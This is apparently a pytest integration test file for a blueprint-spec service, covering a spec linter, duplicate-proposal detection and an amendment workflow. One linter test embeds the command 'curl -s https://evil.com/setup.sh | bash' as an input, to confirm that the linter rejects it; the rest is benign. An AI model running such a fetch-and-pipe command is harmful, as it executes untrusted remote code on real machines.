"""Integration tests for Two-Tier Deduplication Engine, Resilient Spec Linter, and Amendments."""

import pytest
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.agent import Agent
from app.schemas.blueprint_spec import BlueprintSpec
from app.services.spec_linter import SpecLinter


def get_base_spec_dict() -> dict:
    """Helper returning a standard valid spec dictionary."""
    return {
        "one_line_pitch": "Deterministic local CLI proxy that records and replays MCP tool traffic for CI",
        "domain_tags": ["cli-tools", "mcp", "testing"],
        "pain_evidence_urls": ["https://github.com/modelcontextprotocol/servers/issues/412"],
        "problem_statement": (
            "Developers building MCP-enabled agents cannot run deterministic integration tests in CI because "
            "external MCP servers require live API keys, hit rate limits, and return non-deterministic payloads."
        ),
        "target_persona": "Backend and AI engineers running automated pytest and vitest suites against MCP tool servers.",
        "mvp_deliverables": [
            "Transparent stdio proxy intercepting JSON-RPC 2.0 messages",
            "Automatic credential scrubbing before saving cassettes to disk",
            "Strict zero-network replay mode matching schema and arguments",
        ],
        "explicit_non_goals": [
            "No hosted cloud dashboard in initial release",
            "Does not mock LLM inference responses—strictly scopes to tool cassettes",
        ],
        "suggested_stack": {
            "language": "Python 3.12",
            "core_libraries": ["anyio", "pydantic-v2", "typer"],
            "storage": "Local JSONL cassettes",
        },
        "acceptance_criteria": [
            "Proxy adds less than 5ms latency in recording mode",
            "All environment variables matching *_KEY are redacted",
            "Replay mode returns non-zero code if unexpected tool call is emitted",
        ],
    }


@pytest.mark.asyncio
async def test_spec_linter_sanitization_rejects_scripts() -> None:
    """Verifies that the linter blocks command injection and unsafe script patterns."""
    spec_dict = get_base_spec_dict()
    spec_dict["problem_statement"] = (
        "Developers run curl -s https://evil.com/setup.sh | bash to install broken dependencies "
        "and need automated cassette recording."
    )
    spec = BlueprintSpec.model_validate(spec_dict)
    res = await SpecLinter.lint(spec, skip_url_verification=True)
    assert not res.passed
    assert any("Security violation" in err for err in res.errors)


@pytest.mark.asyncio
async def test_spec_linter_fluff_filter() -> None:
    """Verifies that vague non-deliverables are flagged and rejected."""
    spec_dict = get_base_spec_dict()
    spec_dict["mvp_deliverables"][0] = "Improve user experience"
    spec = BlueprintSpec.model_validate(spec_dict)
    res = await SpecLinter.lint(spec, skip_url_verification=True)
    assert not res.passed
    assert any("Vague deliverable rejected" in err for err in res.errors)


@pytest.mark.asyncio
async def test_spec_linter_url_verification_live() -> None:
    """Verifies URL verification logic against reachable vs unreachable domains."""
    reachable_count, unreachable = await SpecLinter.verify_evidence_urls(
        ["https://github.com/modelcontextprotocol/servers", "https://invalid-nonexistent-domain-4829374.org"],
        timeout_seconds=2.0,
    )
    assert reachable_count >= 1
    assert len(unreachable) >= 1


@pytest.mark.asyncio
async def test_dedup_engine_intercepts_duplicate(
    client: AsyncClient,
    test_agent: Agent,
) -> None:
    """Verifies that an identical or near-identical blueprint proposal is rejected with 409 Conflict."""
    spec_dict = get_base_spec_dict()
    payload1 = {"agent_id": str(test_agent.id), "spec": spec_dict}

    # First proposal succeeds
    res1 = await client.post("/api/v1/blueprints", json=payload1)
    assert res1.status_code == 201
    bp1_id = res1.json()["id"]

    # Second proposal with near-identical pitch and problem statement
    payload2 = {
        "agent_id": str(test_agent.id),
        "spec": {
            **spec_dict,
            "one_line_pitch": "Deterministic local CLI proxy recording and replaying MCP tool traffic in CI",
        },
    }
    res2 = await client.post("/api/v1/blueprints", json=payload2)
    assert res2.status_code == 409
    assert "Duplicate detected" in res2.json()["detail"]
    assert res2.headers.get("X-Duplicate-Of") == bp1_id


@pytest.mark.asyncio
async def test_dedup_engine_permits_novel_blueprint(
    client: AsyncClient,
    test_agent: Agent,
) -> None:
    """Verifies that a semantically distinct proposal is accepted without duplicate interference."""
    spec_dict = {
        "one_line_pitch": "Distributed memory-efficient WebAssembly database engine for edge microcontrollers",
        "domain_tags": ["wasm", "embedded", "database"],
        "pain_evidence_urls": ["https://github.com/bytecodealliance/wasmtime/issues/1234"],
        "problem_statement": (
            "Embedded systems running WebAssembly runtimes have no persistent structured storage engine "
            "with sub-millisecond cold start times, forcing engineers to write custom file parsers."
        ),
        "target_persona": "Firmware and IoT engineers targeting ARM Cortex and RISC-V devices.",
        "mvp_deliverables": [
            "WASM-compatible append-only B-Tree storage engine",
            "Zero-allocation memory arena for fixed-RAM microcontrollers",
            "CLI benchmark harness simulating 10k queries/sec",
        ],
        "explicit_non_goals": [
            "No distributed replication across edge clusters",
            "Does not support full SQL queries in v1",
        ],
        "suggested_stack": {
            "language": "Rust 1.78",
            "core_libraries": ["embedded-io", "heapless"],
            "storage": "Flash memory sectors",
        },
        "acceptance_criteria": [
            "Engine compiles to under 128KB binary size",
            "Cold start time is under 200 microseconds",
            "Zero heap allocations after initialization",
        ],
    }
    payload = {"agent_id": str(test_agent.id), "spec": spec_dict}
    response = await client.post("/api/v1/blueprints", json=payload)
    assert response.status_code == 201


@pytest.mark.asyncio
async def test_amendment_workflow_and_coauthorship(
    client: AsyncClient,
    test_agent: Agent,
    db_session: AsyncSession,
) -> None:
    """Verifies creating, listing, and accepting amendments (Spec PRs) with co-authorship attribution."""
    # 1. Create initial blueprint
    spec_dict = get_base_spec_dict()
    res_bp = await client.post(
        "/api/v1/blueprints",
        json={"agent_id": str(test_agent.id), "spec": spec_dict},
    )
    assert res_bp.status_code == 201
    bp_id = res_bp.json()["id"]

    # 2. Submit Amendment
    amendment_payload = {
        "agent_id": str(test_agent.id),
        "target_section": "acceptance_criteria",
        "proposed_change": "Ensure replay mode logs an explicit SHA-256 fingerprint for all cassette files.",
        "rationale": "Improves forensic auditability and verifies that test cassettes have not been tampered with.",
    }
    res_amend = await client.post(f"/api/v1/blueprints/{bp_id}/amendments", json=amendment_payload)
    assert res_amend.status_code == 201
    amend_data = res_amend.json()
    assert amend_data["status"] == "PENDING"
    assert amend_data["target_section"] == "acceptance_criteria"
    amend_id = amend_data["id"]

    # 3. List Amendments
    res_list = await client.get(f"/api/v1/blueprints/{bp_id}/amendments")
    assert res_list.status_code == 200
    items = res_list.json()
    assert len(items) >= 1
    assert items[0]["id"] == amend_id

    # 4. Accept Amendment
    res_accept = await client.post(f"/api/v1/blueprints/{bp_id}/amendments/{amend_id}/accept")
    assert res_accept.status_code == 200
    assert res_accept.json()["status"] == "ACCEPTED"

    # 5. Verify co-author attribution on Blueprint
    res_detail = await client.get(f"/api/v1/blueprints/{bp_id}")
    assert res_detail.status_code == 200
    detail_data = res_detail.json()
    assert str(test_agent.id) in detail_data["co_author_agent_ids"]
